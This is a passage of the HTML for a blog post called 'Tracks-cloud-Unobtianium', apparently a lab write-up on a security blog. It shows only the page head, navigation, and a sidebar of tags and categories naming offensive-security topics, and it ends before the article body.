<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>Tracks-cloud-Unobtianium | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="nmap1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011">
<meta property="og:type" content="article">
<meta property="og:title" content="Tracks-cloud-Unobtianium">
<meta property="og:url" content="http://example.com/2024/12/08/Tracks-cloud-Unobtianium/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="nmap1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2024/tracks-cloud/Unobtianium/background.jpg">
<meta property="article:published_time" content="2024-12-08T09:10:21.000Z">
<meta property="article:modified_time" content="2024-12-09T10:25:55.236Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="k8s">
<meta property="article:tag" content="nodejs">
<meta property="article:tag" content="merge">
<meta property="article:tag" content="deb">
<meta property="article:tag" content="sercerts">
<meta property="article:tag" content="pods">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2024/tracks-cloud/Unobtianium/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GPO/" rel="tag">GPO</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gbbion/" rel="tag">Gbbion</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IDOR/" rel="tag">IDOR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nodeport/" rel="tag">Nodeport</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/OU/" rel="tag">OU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RECYCLE-BIN/" rel="tag">RECYCLE.BIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteGPlink/" rel="tag">WriteGPlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bbot/" rel="tag">bbot</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bloodhound/" rel="tag">bloodhound</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fifo/" rel="tag">fifo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ispconfig/" rel="tag">ispconfig</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jar/" rel="tag">jar</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kube-proxy/" rel="tag">kube-proxy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/lsaquery/" rel="tag">lsaquery</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/neo4j/" rel="tag">neo4j</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">11</div>
            </a>
        
